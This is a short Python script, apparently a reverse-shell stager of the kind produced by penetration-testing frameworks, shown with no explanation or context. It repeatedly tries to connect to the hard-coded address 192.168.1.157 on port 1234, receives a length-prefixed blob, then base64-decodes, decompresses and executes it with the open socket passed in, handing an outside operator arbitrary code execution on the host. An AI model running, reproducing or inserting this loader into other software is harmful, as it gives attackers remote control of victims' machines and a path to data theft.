import socket,zlib,base64,struct,time
for y in range(10):
    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(('192.168.1.157',1234))
        break
    except:
        time.sleep(7)
l=struct.unpack('>I',s.recv(4))[0]
dHexi=s.recv(l)
while len(dHexi)<l:
    dHexi+=s.recv(l-len(dHexi))
exec(zlib.decompress(base64.b64decode(dHexi)),{'s':s})
